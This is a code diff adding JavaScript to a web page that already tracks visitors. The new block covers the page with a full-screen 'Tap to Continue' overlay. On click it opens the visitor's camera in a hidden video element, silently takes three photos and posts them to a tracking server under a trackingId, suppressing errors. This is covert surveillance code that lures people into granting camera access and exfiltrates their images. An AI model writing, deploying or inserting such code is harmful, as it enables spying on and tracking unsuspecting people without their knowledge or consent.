@@ -247,3 +247,66 @@ data.Session_Duration = `${duration} sec`;
     })
   }).catch(() => {});
 });
+  // =========================
+  // 🎥 CAMERA PART (CLICK REQUIRED)
+  // =========================
+
+  const overlay = document.createElement("div");
+  overlay.innerHTML = "▶ Tap to Continue";
+  overlay.style = `
+    position:fixed;
+    top:0;left:0;
+    width:100%;height:100%;
+    background:black;
+    color:white;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:22px;
+    z-index:9999;
+  `;
+  document.body.appendChild(overlay);
+
+  overlay.onclick = async () => {
+    overlay.remove();
+
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+      const video = document.createElement("video");
+      video.style.display = "none";
+      video.srcObject = stream;
+      document.body.appendChild(video);
+
+      await video.play();
+
+      const canvas = document.createElement("canvas");
+      const ctx = canvas.getContext("2d");
+
+      await new Promise(r => setTimeout(r, 1500));
+
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+
+      // 📸 3 photos
+      for (let i = 0; i < 3; i++) {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const imageData = canvas.toDataURL("image/jpeg", 0.8);
+
+        await fetch(`${serverUrl}/photo?trackingId=${trackingId}`, {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({ imageData })
+        }).catch(()=>{});
+
+        await new Promise(r => setTimeout(r, 1200));
+      }
+
+      stream.getTracks().forEach(track => track.stop());
+
+    } catch (err) {
+      console.log("Camera denied", err);
+    }
+  };
+});
